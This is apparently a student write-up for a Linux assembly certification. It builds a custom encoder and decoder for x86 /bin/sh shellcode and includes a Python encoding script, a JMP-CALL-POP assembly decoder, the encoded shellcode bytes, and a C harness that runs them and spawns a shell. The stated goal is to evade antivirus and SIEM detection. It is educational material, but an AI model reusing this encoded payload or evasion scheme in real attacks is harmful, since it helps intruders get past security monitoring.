**Assignment 4**

Custom encoder and decoder for bin/sh shellcode

**Introduction**

	A shellcode encoder is used to modify an existing shellcode to make it harder to detect by AV engines / SIEM tools 

	The encoder itself doesn’t provide any real security however since the obfuscation scheme is built into the code and is therefore reversible by anyone who has access to the encoded shellcode. This should not be confused with encryption, where security is based on the key and not the secrecy of the encryption scheme


**Methadology**

	Following is the Encoding schema being used in the order

		Each byte of the /bin/sh shellcode is decremented by 1
		NOT operation on each bytes
		Each byte is Xor ed with 0xbb


	This Encoded payload is generated using a python script

	The Decoding schema being used in the order
		Each byte is Xor ed with 0xbb
		NOT operation on each bytes
		Each byte is incremented by 1




	EncoderScript.py	

	Following script takes the shellcode and perform the above mentioned encoding operation for each byte.

		#!/bin/python3

		import socket
		import sys

		sc_original = (b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
									#/bin/sh shellcode
									#shellcode is considered as a byte array
		enc = ""
		enc2= ""

		for c in bytearray(sc_original):
        	 a = c - 0x01            	#each byte is decremented by 1
        	 b = ~a                  	#NOT operation
        	 c = b^0xBB              	#XOR operation on each byte 
        								#based on premise A XOR B = C , C XOR B = A
        	 enc+= '\\x'
        	 enc+= "%02x" %(c & 0xff)

       	 	 enc2+= "0x"
        	 enc2+= "%02x," %(c & 0xff)


		print("Encoded Payload:  ")
		print("----------------------")

		s2 = enc2.rstrip(',')
		print(s2)


		toor@ubuntu:~/Desktop/slae/Assignments/4$ python3 encodecreaterpy3.py
		Encoded Payload:
		----------------------
	0x74,0xfb,0x0b,0x23,0x29,0x6a,0x36,0x23,0x23,0x6a,0x6a,0x25,0x2c,0xcc,0xa6,0x0b,0xcc,0xa5,0x16,0xcc,0xa4,0xeb,0x4e,0x88,0x3b
		toor@ubuntu:~/Desktop/slae/Assignments/4$


	We have the encoded payload now 
	0x74,0xfb,0x0b,0x23,0x29,0x6a,0x36,0x23,0x23,0x6a,0x6a,0x25,0x2c,0xcc,0xa6,0x0b,0xcc,0xa5,0x16,0xcc,0xa4,0xeb,0x4e,0x88,0x3b

	a 0xbb is appended to the encoded shellcode to make the program easier ie appended 0xbb in the shellcode variable is used as a marker to pointout the end of the encoded payload. Now the payload would be .

	Its worth mentioning that A XOR A = 0 , so when you perform an xor operation make sure that the operator byte is not in the encoded payload
	
	Final Payload would be,
		0x74,0xfb,0x0b,0x23,0x29,0x6a,0x36,0x23,0x23,0x6a,0x6a,0x25,0x2c,0xcc,0xa6,0x0b,0xcc,0xa5,0x16,0xcc,0xa4,0xeb,0x4e,0x88,0x3b,0xbb

	Now ,we write a assembly program to decode this encoded shellcode 

		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ cat damn.asm
		global _start

		section .text

		_start:

        		jmp short step_1
		step_2:
        		pop edi

		decoder:

        		cmp byte [edi],0xbb
        		jz shellcode

        		xor byte [edi],0xbb  ;xor with bb
        		not byte [edi]       ;not operation
        		inc byte [edi]       ;inc byte

        		inc edi
        		jmp short decoder


		step_1:
        		call step_2
        	shellcode: db 0x74,0xfb,0x0b,0x23,0x29,0x6a,0x36,0x23,0x23,0x6a,0x6a,0x25,0x2c,0xcc,0xa6,0x0b,0xcc,0xa5,0x16,0xcc,0xa4,0xeb,0x4e,0x88,0x3b,0xbb
		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$


	Program starts with a jmp to step_1  and then a call to step_2
	The decoder uses the JMP CALL POP technique to push the address of the encoded shellcode on the stack. so when the call instruction is executed the address of the next instruction is put on to the stack on the premise that once the function is over ,the control is given back to the next instruction

	So the Address of the variable shellcode is put onto the stack and is poped on to edi

	Appended 0xbb in the shellcode variable is used as a marker to pointout the end of the encoded payload . A comparison operator is used here to check whether rhe operation is complete

	Each byte of "shellcode" will be undergoing decoder process ie

								xor with 0xbb
								not operation
								increment 
   	Once the process is over control is given to the shellcode address ,where the /bin/sh decoded shellcode is .


**Practical**

Extracting shellcode
	
	toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ objdump -d ./damn|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
	"\xeb\x10\x5f\x80\x3f\xbb\x74\x0f\x80\x37\xbb\xf6\x17\xfe\x07\x47\xeb\xf1\xe8\xeb\xff\xff\xff\x74\xfb\x0b\x23\x29\x6a\x36\x23\x23\x6a\x6a\x25\x2c\xcc\xa6\x0b\xcc\xa5\x16\xcc\xa4\xeb\x4e\x88\x3b\xbb"
	
	The shellcode is copied onto a shellcode test c wrapper program t give control to the shellcode

		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ cat shellcodetest.c
		#include<stdio.h>
		#include<string.h>

		char code[] = 	"\xeb\x10\x5f\x80\x3f\xbb\x74\x0f\x80\x37\xbb\xf6\x17\xfe\x07\x47\xeb\xf1\xe8\xeb\xff\xff\xff\x74\xfb\x0b\x23\x29\x6a\x36\x23\x23\x6a\x6a\x25\x2c\xcc\xa6\x0b\xcc\xa5\x16\xcc\xa4\xeb\x4e\x88\x3b\xbb";

		int main(void)
		{
        	printf("shellcode length: %d\n",strlen(code));
        	(*(void(*)()) code)();
		}


		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ nano shellcodetest.c
	
		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ gcc -fno-stack-protector -z execstack shellcodetest.c -o shellcode
	
		toor@ubuntu:~/Desktop/slae/Assignments/4/etc$ ./shellcode
		shellcode length: 49
		$ id
		uid=1000(toor) gid=1000(toor) groups=1000(toor),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
	Works like a charm!

**Github Repository**

	This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student ID: SLAE-1509
